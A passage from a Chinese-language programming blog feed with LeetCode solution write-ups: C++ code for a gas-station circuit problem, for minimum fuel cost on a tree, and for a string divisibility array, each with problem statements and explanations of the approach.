class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">canCompleteCircuit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; gas, vector&lt;<span class="type">int</span>&gt;&amp; cost)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> length=gas.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> start=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(;start&lt;length;start++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(gas[start]&gt;=cost[start])<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(start&lt;length)&#123;</span><br><span class="line">            <span class="type">int</span> remain=gas[start]-cost[start];</span><br><span class="line">            <span class="type">int</span> end=(start+<span class="number">1</span>)%length;</span><br><span class="line">            <span class="keyword">while</span>(start&lt;length)&#123;</span><br><span class="line">                <span class="keyword">while</span>(remain&gt;=<span class="number">0</span>&amp;&amp;end!=start)&#123;</span><br><span class="line">                    remain+=gas[end]-cost[end];</span><br><span class="line">                    end=(end+<span class="number">1</span>)%length;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(start==end)&#123;</span><br><span class="line">                    <span class="keyword">return</span> (remain&gt;=<span class="number">0</span>)?start:<span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span>(remain&lt;<span class="number">0</span>&amp;&amp;start!=end&amp;&amp;start&lt;length)&#123;</span><br><span class="line">                    remain+=cost[start]-gas[start];</span><br><span class="line">                    start++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(start==end)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(;start&lt;length;start++)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(gas[start]&gt;=cost[start])&#123;</span><br><span class="line">                            remain=gas[start]-cost[start];</span><br><span class="line">                            end=(start+<span class="number">1</span>)%length;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="到达首都的最少油耗中等"><a href="https://leetcode.cn/problems/minimum-fuel-cost-to-report-to-the-capital/">到达首都的最少油耗</a>(中等)</h2><h3 id="题目描述-18">题目描述</h3><p>给你一棵 <code>n</code>个节点的树（一个无向、连通、无环图），每个节点表示一个城市，编号从<code>0</code> 到 <code>n - 1</code> ，且恰好有 <code>n - 1</code>条路。<code>0</code> 是首都。给你一个二维整数数组 <code>roads</code>，其中 <code>roads[i] = [ai, bi]</code> ，表示城市 <code>ai</code> 和<code>bi</code> 之间有一条 <strong>双向路</strong> 。</p><p>每个城市里有一个代表，他们都要去首都参加一个会议。</p><p>每座城市里有一辆车。给你一个整数 <code>seats</code>表示每辆车里面座位的数目。</p><p>城市里的代表可以选择乘坐所在城市的车，或者乘坐其他城市的车。相邻城市之间一辆车的油耗是一升汽油。</p><p>请你返回到达首都最少需要多少升汽油。</p><p><strong>示例 1：</strong></p><figure><img src="/post/4d65bd11/a4c380025e3ff0c379525e96a7d63a3.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：roads = [[0,1],[0,2],[0,3]], seats = 5</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">- 代表 1 直接到达首都，消耗 1 升汽油。</span><br><span class="line">- 代表 2 直接到达首都，消耗 1 升汽油。</span><br><span class="line">- 代表 3 直接到达首都，消耗 1 升汽油。</span><br><span class="line">最少消耗 3 升汽油。</span><br></pre></td></tr></table></figure><h3 id="思路-17">思路</h3><p>可以将题目理解为以下过程，首先从0位置开始，到0位置消耗的总的汽油数等于0相邻的所有点消耗的汽油数加上相邻点到0所消耗的总的汽油数，以此类推就是递归，终止条件是递归到最后的点，该点往前消耗的汽油数就是1，因为该点不能再往后并且该点只有一个代表</p><p>每次递归我设置了两个返回值，因为我们既要知道到该点的代表数，又要知道已经消耗了的汽油数</p><p>（ps:看到题解将消耗了的汽油数设置成了全局变量，因为每个点实际上只会遍历一次，所以不需要传递这个值，对全局变量进行更新即可）</p><h3 id="代码-18">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    unordered_map&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt;&gt;map;</span><br><span class="line">    <span class="type">int</span> seatss;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">numberOfRoad</span><span class="params">(<span class="type">int</span>&amp; pre,<span class="type">int</span>&amp; start)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> length=map[start].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;<span class="built_in">sum</span>(<span class="number">2</span>);<span class="comment">//sum[0]是车辆数量，sum[1]是消耗的汽油数量</span></span><br><span class="line">        vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;<span class="built_in">temp</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> &amp;node : map[start])&#123;</span><br><span class="line">            <span class="keyword">if</span>(node!=pre)&#123;</span><br><span class="line">                temp=<span class="built_in">numberOfRoad</span>(start,node);</span><br><span class="line">                sum[<span class="number">0</span>]+=temp[<span class="number">0</span>];</span><br><span class="line">                sum[<span class="number">1</span>]+=temp[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(start==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> sum;</span><br><span class="line">        &#125;</span><br><span class="line">        sum[<span class="number">0</span>]++;</span><br><span class="line">        sum[<span class="number">1</span>]+=sum[<span class="number">0</span>]/seatss;</span><br><span class="line">        <span class="keyword">if</span>(sum[<span class="number">0</span>]%seatss!=<span class="number">0</span>)&#123;</span><br><span class="line">            sum[<span class="number">1</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">minimumFuelCost</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; roads, <span class="type">int</span> seats)</span> </span>&#123;</span><br><span class="line">        seatss=seats;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;road : roads)&#123;</span><br><span class="line">            map[road[<span class="number">0</span>]].<span class="built_in">push_back</span>(road[<span class="number">1</span>]);</span><br><span class="line">            map[road[<span class="number">1</span>]].<span class="built_in">push_back</span>(road[<span class="number">0</span>]);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="type">int</span> pre=<span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> start=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">numberOfRoad</span>(pre,start)[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="找出字符串的可整除数组中等">找出字符串的可整除数组（中等）</h2><h3 id="题目描述-19">题目描述</h3><p>给你一个下标从 <strong>0</strong> 开始的字符串 <code>word</code>，长度为 <code>n</code> ，由从 <code>0</code> 到 <code>9</code>的数字组成。另给你一个正整数 <code>m</code> 。</p><p><code>word</code> 的 <strong>可整除数组</strong> <code>div</code>是一个长度为 <code>n</code> 的整数数组，并满足：</p><ul><li>如果 <code>word[0,...,i]</code> 所表示的 <strong>数值</strong> 能被<code>m</code> 整除，<code>div[i] = 1</code></li><li>否则，<code>div[i] = 0</code></li></ul><p>返回 <code>word</code> 的可整除数组。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：word = &quot;998244353&quot;, m = 3</span><br><span class="line">输出：[1,1,0,0,0,1,1,0,0]</span><br><span class="line">解释：仅有 4 个前缀可以被 3 整除：&quot;9&quot;、&quot;99&quot;、&quot;998244&quot; 和 &quot;9982443&quot; 。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：word = &quot;1010&quot;, m = 10</span><br><span class="line">输出：[0,1,0,1]</span><br><span class="line">解释：仅有 2 个前缀可以被 10 整除：&quot;10&quot; 和 &quot;1010&quot; 。</span><br></pre></td></tr></table></figure><h3 id="思路-18">思路</h3><p>由于此处的word太长，所以只能使用模运算，假设num是将字符转换为数字，则<code>word=(  (num(word[0])*10)  +  num(word[1])  )*10...+num(word[word.size()-1])</code>，由<code>a mod m + b mod m = a+b mod m</code>，则<code>num(word) mod m=(num(word[0])*10+num(word[1]))*10... mod m</code></p><h3 id="代码-19">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">divisibilityArray</span><span class="params">(string word, <span class="type">int</span> m)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> length=word.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(length)</span></span>;</span><br><span class="line">        <span class="type">long</span> mod=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">            mod=(mod*<span class="number">10</span>+(word[i]-<span class="string">&#x27;0&#x27;</span>))%m;</span><br><span class="line">            ans[i]=mod==<span class="number">0</span>?<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;111&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="c" scheme="http://example.com/tags/c/"/>
    
    <category term="c++" scheme="http://example.com/tags/c/"/>
    
  </entry>
  
</feed>
